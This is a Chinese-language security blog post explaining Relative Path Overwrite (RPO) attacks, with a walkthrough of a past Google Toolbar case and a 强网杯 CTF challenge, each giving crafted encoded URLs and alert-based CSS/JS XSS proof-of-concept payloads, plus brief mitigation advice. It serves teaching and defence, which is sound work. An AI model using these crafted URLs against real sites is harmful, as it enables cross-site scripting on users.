{"title":"RPO攻击原理介绍和利用","slug":"网安大类/OWASPTOP/WebFrontEnd/RPO攻击原理介绍和利用","date":"2019-11-17T10:36:30.000Z","updated":"2022-03-30T05:02:09.821Z","url":"2019/11-17-391.html","path":"api/articles/2019/11-17-391.html.json","covers":["https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191127125007.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191127125643.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191127125944.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191127131652.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191127131829.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191127132249.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191127132554.png"],"content":"<p><b style=\"color:red\">注意：本文分享给安全从业人员、网站开发人员以及运维人员在日常工作防范恶意攻击,请勿恶意使用下面介绍技术进行非法攻击操作。。</b></p>\n<p>[TOC]</p>\n<a id=\"more\"></a>\n<h4 id=\"0x00-前言介绍\"><a href=\"#0x00-前言介绍\" class=\"headerlink\" title=\"0x00 前言介绍\"></a>0x00 前言介绍</h4><p>描述:说实在第一个看这个漏洞的时候是没挣明白的有点绕(大佬一眼应该就能观定)，下面大致对PRO做一个介绍;</p>\n<p><em>什么是RPO攻击？</em><br>RPO(<code>Relative Path Overwrite</code>)相对路径覆盖,是一种新型攻击技术，最早由Gareth Heyes在其发表的文章中提出。主要是利用浏览器的一些特性和部分服务端的配置差异导致的漏洞，通过一些技巧，我们可以通过相对路径来引入其他的资源文件，以至于达成我们想要的目的。</p>\n<p>就目前来看此攻击方法依赖于浏览器和网络服务器的反应，基于服务器的Web缓存技术和配置差异，以及服务器和客户端浏览器的解析差异，利用前端代码中加载的css/js的相对路径来加载其他文件，最终浏览器将服务器返回的不是css/js的文件当做css/js来解析，从而<code>导致XSS，信息泄露</code>等漏洞产生。</p>\n<p><em>网站是如何加载的?</em></p>\n<ul>\n<li>根据程序员编写的代码从上到下进行执行</li>\n<li>HTML加载域CSS渲染JS脚本解析; <code>其中页面的加载和渲染都需要通过脚本执行</code>，并且在脚本执行过程中网站的加载暂时停止，等待脚本加载完成，特别是JavaScript和src引入JavaScript（<code>会暂停直接进行解析并执行</code>，并且连续<code>载入</code>两个JavaScript文件加载过程中会有一段时间的间隔，这段时间就是<code>js代码执行的时间</code>）</li>\n</ul>\n<p><br></p>\n<h4 id=\"0x01-RPO漏洞原理-principle\"><a href=\"#0x01-RPO漏洞原理-principle\" class=\"headerlink\" title=\"0x01 RPO漏洞原理(principle)\"></a>0x01 RPO漏洞原理(principle)</h4><p>原理:RPO漏洞相对路径覆盖并且源码中引用了相对路径css文件所导致的脆弱性漏洞，一般的可利用手段就是CSS攻击钓鱼和CSS-XSS 攻击。<br>本质:根据服务器解析与浏览器（客户端）解析URL之间的微小差异而产生的漏洞，</p>\n<p>RPO漏洞攻击的条件:</p>\n<ul>\n<li>可利用页面无DOCTYPE</li>\n<li>标签中包含相对路径的CSS/js/swf文件</li>\n<li>浏览器解析页面路径有误而导致css文件加载路径错误，从而引发的任意解析。</li>\n</ul>\n<p>对于php而言它获得的请求是url解码后的<code>%2F会被解码为/</code> , apache和nginx会按照目录的方式来返回我们请求的资源。<br>服务端和客户端之间产生了沟通差异，浏览器在寻找js资源的时候，并没有对%2f进行解码则导致将%2f+后续的字符串 认为是一个文件;</p>\n<p>脆弱性的演示Demo: <a href=\"http://www.google.com/tools/toolbar/buttons/apis%2fhowto_guide.html\" target=\"_blank\" rel=\"noopener\">http://www.google.com/tools/toolbar/buttons/apis%2fhowto_guide.html</a><br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#注意这里也并没有<span class=\"meta\">&lt;!Doctype HTML&gt;</span> 标记；</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Google Toolbar API - Guide to Making Custom Buttons<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">href</span>=<span class=\"string\">\"../../styles.css\"</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/css\"</span> /&gt;</span> <span class=\"comment\">&lt;!--- Href 关键点 ---&gt;</span></span><br></pre></td></tr></table></figure></p>\n<ol>\n<li><p>访问上面的网站<code>%2f = /</code>则服务器容器解析<code>/apis/howto_guide.html</code>,而浏览器解析会将其看作是一个文件<code>apis%2fhowto_guide.html</code>,其次CSS样式表的理解也是一个文件<code>apis%2fhowto_guide.html</code></p>\n</li>\n<li><p>我们来还原一下正常的解析情况和采用<code>%2f</code>后的解析情况</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#1.使用 / 的网站地址</span></span><br><span class=\"line\">http://www.google.com/tools/toolbar/buttons/apis/howto_guide.html  <span class=\"comment\"># 实际服务器中的html文件名词howto_guide.html</span></span><br><span class=\"line\">http://www.google.com/tools/toolbar/style.css  <span class=\"comment\">#此时的css样式表包含地址 (实际存在的)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#2.使用 %2f 的网站地址</span></span><br><span class=\"line\">http://www.google.com/tools/toolbar/buttons/apis%2fhowto_guide.html  <span class=\"comment\">#将apis%2fhowto_guide.html看作是一个文件，但是服务器却可以进行解析</span></span><br><span class=\"line\">http://www.google.com/tools/style.css         <span class=\"comment\">#此时的css样式表包含地址（实际不存在）</span></span><br></pre></td></tr></table></figure>\n<p>结果导致style.css不存在，所以无法加载css样式表,现在浏览器认为我们的目录是<code>/tools/toolbar/buttons/</code>而不是<code>/tools/toolbar/buttons/apis</code>。</p>\n</li>\n</ol>\n<ol start=\"3\">\n<li><p>尝试创建个fake目录和..%2ftoolbar 网站地址如:<a href=\"http://www.google.com/tools/fake/..%2ftoolbar/buttons/apis%2fhowto_guide.html\" target=\"_blank\" rel=\"noopener\">http://www.google.com/tools/fake/..%2ftoolbar/buttons/apis%2fhowto_guide.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">服务器理解:http://www.google.com/tools/toolbar/buttons/apis%2fhowto_guide.html <span class=\"comment\">#因为fake和..%2ftoolbar目录不存在</span></span><br><span class=\"line\">浏览器理解:http://www.google.com/tools/fake/..%2ftoolbar/buttons/apis%2fhowto_guide.html</span><br><span class=\"line\">css样式表:http://www.google.com/tools/fake/style.css</span><br></pre></td></tr></table></figure>\n<p>添加了<code>fake 和..%2ftoolbar</code>虚假目录,浏览器认为<code>fake和..%2ftoolbar都是目录</code>，因为他们中间都有/*/，而%2f被理解成了文件。</p>\n</li>\n<li><p>经过实验证明，理论上我们可以css覆盖:<code>http://www.google.com/*/style.css</code>，但是我们再次往上层编码，发现这是不行的会出错。<br><code>所以css覆盖止步于:http://www.google.com/tools/*/style.css</code>,我们需要在Tools目录下找寻可以被利用的点</p>\n</li>\n<li><p>找寻利用点 <code>http://www.google.com/tools/toolbar/buttons/gallery?q=1</code> 会进行二次跳转跳转到 <code>http://www.google.com/gadgets/directory?synd=toolbar&amp;frontpage=1&amp;q=1</code></p>\n</li>\n<li><p>验证利用点准备尝试植入CSS</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.google.com/tools/toolbar/buttons/gallery?q=&#123;&#125;*&#123;background:red&#125;</span><br><span class=\"line\"><span class=\"comment\">#跳转　　</span></span><br><span class=\"line\">http://www.google.com/gadgets/directory?synd=toolbar&amp;frontpage=1&amp;q=&#123;&#125;*&#123;background:red&#125; <span class=\"comment\">#css代码成功植入，虽然他不在style样式表中。</span></span><br></pre></td></tr></table></figure>\n<figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191127125007.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n</li>\n</ol>\n<ol start=\"7\">\n<li>为什么只能使用接口而不能使用跳转链接进行攻击?<br>现在我们来利用它:<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">构造地址:http://www.google.com/tools/toolbar/buttons%2Fgallery%3Fq%3D%0a%7B%7D*%7Bbackground％3Ared％7D/..%2F的/apis/howto_guide.html</span><br><span class=\"line\">服务器理解:http://www.google.com/tools/toolbar/buttons//apis/howto_guide.html</span><br><span class=\"line\">浏览器理解:http://www.google.com/tools/toolbar/buttons%2Fgallery%3Fq%3D%0a%7B%7D*%7Bbackground％3Ared％7D/..%2F的/apis/howto_guide.html</span><br><span class=\"line\"></span><br><span class=\"line\">/tools/toolbar/buttons%2fgallery%3fq%3d%250a%257B%257D*%257Bbackground%253Ared%257D/..%2f/apis/../../style.css <span class=\"comment\">#浏览器会认为目前在的目录是apis向上之后就到了下面的css样式表</span></span><br><span class=\"line\">css样式表:http://www.google.com/tools/toolbar/buttons/gallery?q=%0a&#123;&#125;*&#123;background:red&#125;/style.css  <span class=\"comment\">#访问之后会跳转到下面URL，然后进行二次跳转</span></span><br><span class=\"line\">/gadgets/directory?synd=toolbar&amp;frontpage=1&amp;q=%0a&#123;&#125;*&#123;background:red&#125;/style.css <span class=\"comment\">#最终样式表</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#原始的未污染的样式表</span></span><br><span class=\"line\">&lt;link href=<span class=\"string\">\"../../styles.css\"</span> rel=<span class=\"string\">\"stylesheet\"</span> <span class=\"built_in\">type</span>=<span class=\"string\">\"text/css\"</span> /&gt;</span><br><span class=\"line\"><span class=\"comment\">#转变(#就把&#123;&#125;*&#123;background:red&#125;包含了)</span></span><br><span class=\"line\">&lt;link href=<span class=\"string\">\"/gadgets/directory?synd=toolbar&amp;frontpage=1&amp;q=%0a&#123;&#125;*&#123;background:red&#125;/style.css\"</span> rel=<span class=\"string\">\"stylesheet\"</span> <span class=\"built_in\">type</span>=<span class=\"string\">\"text/css\"</span> /&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191127125643.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n</li>\n</ol>\n<p>测试POC: <a href=\"http://www.google.com/tools/toolbar/buttons%2fgallery%3fq%3d%250a%257B%257D*%257Bx%253Aexpression(alert(document.domain))%257D/..%2f/apis/howto_guide.html\" target=\"_blank\" rel=\"noopener\">http://www.google.com/tools/toolbar/buttons%2fgallery%3fq%3d%250a%257B%257D*%257Bx%253Aexpression(alert(document.domain))%257D/..%2f/apis/howto_guide.html</a></p>\n<figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191127125944.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n<p><br></p>\n<h4 id=\"0x02-漏洞利用案例\"><a href=\"#0x02-漏洞利用案例\" class=\"headerlink\" title=\"0x02 漏洞利用案例\"></a>0x02 漏洞利用案例</h4><p><strong>案例1.强网杯案例</strong><br>描述: <a href=\"http://39.107.33.96:20000/index.php\" target=\"_blank\" rel=\"noopener\">http://39.107.33.96:20000/index.php</a> 调用了相对路径的js ,第一个是相对路径，第二个是绝对路径<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191127131652.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<ol>\n<li>我们创建一个包含js脚本的页面：<code>http://39.107.33.96:20000/index.php/view/article/3093</code> 即 <code>alert(1)</code>;</li>\n</ol>\n<figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191127131829.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n<ol start=\"2\">\n<li><p>构造xss利用点</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#POC:http://39.107.33.96:20000/index.php/view/article/3093/..%2f..%2f..%2f/index.php</span></span><br><span class=\"line\"></span><br><span class=\"line\">服务器端解析: http://39.107.33.96:20000/index.php  <span class=\"comment\">#向上跳了三层，依旧返回index.php页面的内容,其中包含有js相对资源: static/js/jquery.min.js</span></span><br><span class=\"line\">浏览器端在渲染的时候无法url解码:http://39.107.33.96:20000/index.php/view/article/3093/..%2f..%2f..%2f</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#所以 static/js/jquery.min.js 是接在目录 3093/后面，构成了</span></span><br><span class=\"line\">http://39.107.33.96:20000/index.php/view/article/3093/static/js/jquery.min.js</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#然后在渲染的时候将该页面的内容作为js脚本来加载</span></span><br><span class=\"line\">http://39.107.33.96:20000/index.php/view/article/3093</span><br></pre></td></tr></table></figure>\n<figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191127132249.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n</li>\n<li><p>最终效果：</p>\n</li>\n</ol>\n<figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191127132554.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n<p><br></p>\n<h4 id=\"0x03-漏洞修复\"><a href=\"#0x03-漏洞修复\" class=\"headerlink\" title=\"0x03 漏洞修复\"></a>0x03 漏洞修复</h4><ul>\n<li>建议在对js或者swf以及css或者其他页面包含的时候，在页面中避免直接使用相对路径进行静态文件的加载,尽量不要出现如”../../../xxxx.js”相对路径的调用；</li>\n</ul>\n<p><br></p>\n<h4 id=\"0x04-参考\"><a href=\"#0x04-参考\" class=\"headerlink\" title=\"0x04 参考\"></a>0x04 参考</h4><ul>\n<li><a href=\"https://www.jianshu.com/p/5b174dcba362\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/5b174dcba362</a></li>\n<li><a href=\"http://blog.nsfocus.net/rpo-attack/\" target=\"_blank\" rel=\"noopener\">http://blog.nsfocus.net/rpo-attack/</a></li>\n<li><a href=\"https://xz.aliyun.com/t/2220\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/2220</a></li>\n</ul>\n","comments":true,"excerpt":"注意：本文分享给安全从业人员、网站开发人员以及运维人员在日常工作防范恶意攻击,请勿恶意使用下面介绍技术进行非法攻击操作。。[TOC]","categories":[{"name":"前端漏洞","path":"api/categories/前端漏洞.json"}],"tags":[{"name":"RPO","path":"api/tags/RPO.json"}]}